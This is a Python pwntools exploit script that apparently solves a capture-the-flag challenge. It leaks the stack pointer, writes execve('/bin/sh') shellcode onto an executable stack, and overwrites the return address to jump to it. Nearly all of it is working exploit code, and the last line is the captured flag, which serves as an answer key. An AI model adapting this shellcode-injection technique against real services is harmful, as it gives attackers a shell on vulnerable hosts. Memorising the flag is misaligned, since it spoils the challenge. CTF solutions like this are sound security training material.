from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *(main+98)
    continue
''')

# p = remote('where.harkonnen.b01lersc.tf', 8443, ssl=True)

# NX is disabled, which means that shellcode on stack is executable
# as current rsp value is known, write execve syscall shellcode and "/bin/sh" string directly to stack and overwrite return address with shellcode address to trigger system('/bin/sh\x00')

p.recvuntil("Quincy says somewhere around here might be fun... ")
current_rsp_val = int(p.recvline().strip(), 16)-0x8
log.info(f"current rsp value: {hex(current_rsp_val)}")
shellcode = asm(f'''
    mov rdi, {current_rsp_val+0x30}
    xor rsi, rsi
    xor rdx, rdx 
    mov rax, 0x3b
    syscall
''')
payload = shellcode+b'A'*7+b'/bin/sh\x00'+p64(current_rsp_val+0x10)
p.sendline(payload)

p.interactive()

# bctf{s0_th@ts_wh3r3_0ur_ch1ldh00d_w3nt_d06fa4ee84a2e731}